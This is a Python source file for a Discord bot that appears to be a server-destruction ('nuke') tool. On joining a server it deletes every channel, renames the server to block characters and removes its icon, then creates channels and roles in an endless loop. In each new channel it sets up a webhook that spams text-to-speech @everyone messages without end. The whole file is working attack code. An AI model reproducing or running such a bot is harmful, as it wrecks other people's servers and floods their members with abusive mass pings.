import discord
bot = discord.Client()
import json

with open('setting.json', mode='r',encoding='utf8') as jfile:
    jdata = json.load(jfile)

@bot.event
async def on_guild_join(guild):
    for channel in guild.channels:
        await channel.delete()

    await guild.edit(
        name="█" * 100,
        icon=None
    )

    while True:
        await guild.create_text_channel("█" * 100)
        try:
            await guild.create_role(name="█" * 100)
        except:
            pass


@bot.event
async def on_guild_channel_create(channel):
    msg = "@everyone" + '\n' * 1990 + "█"
    webhook = await channel.create_webhook(name="█" * 80)

    while True:
        await webhook.send(
            content=msg,
            tts=True,
            allowed_mentions=discord.AllowedMentions(everyone=True))
        await channel.send(msg)

bot.run(jdata['TestBotTOKEN'])